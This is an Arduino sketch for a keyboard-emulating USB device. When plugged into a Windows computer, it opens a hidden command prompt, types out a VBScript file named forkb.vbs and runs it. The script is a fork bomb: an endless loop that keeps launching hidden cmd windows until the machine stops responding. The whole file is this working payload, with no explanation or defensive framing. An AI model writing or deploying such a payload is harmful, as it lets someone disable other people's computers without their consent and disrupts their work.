#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  Keyboard.begin();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("copy con forkb.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN);

  Keyboard.print("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("start forkb.vbs && exit");
  
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {}
